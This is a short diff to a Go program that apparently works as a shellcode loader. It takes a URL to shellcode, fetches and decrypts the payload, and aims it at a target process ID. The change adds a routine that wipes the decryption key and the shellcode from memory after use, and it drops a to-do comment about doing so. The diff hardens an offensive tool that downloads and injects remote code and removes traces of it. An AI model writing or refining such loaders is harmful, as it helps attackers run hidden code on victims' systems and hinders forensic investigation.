@@ -34,6 +34,12 @@ func fetchPayload(url string) ([]byte, error) {
 	return io.ReadAll(resp.Body)
 }
 
+func zero(b []byte) {
+	for i := 0; i < len(b); i++ {
+		b[i] = 0
+	}
+}
+
 func main() {
 	var url string
 	flag.StringVar(&url, "url", "", "URL to shellcode")
@@ -62,6 +68,9 @@ func main() {
 		fmt.Printf("Error decrypting payload: %v\n", err)
 		os.Exit(1)
 	}
+
+	defer zero(key)
+	defer zero(sc)
 
 	pid, err := strconv.ParseUint(flag.Arg(0), 10, 32)
 	if err != nil {
@@ -149,5 +158,4 @@ func main() {
 	}
 	fmt.Printf("Event Created :%v\n", event)
 
-	// TO_DO Zero out key and shellcode
 }
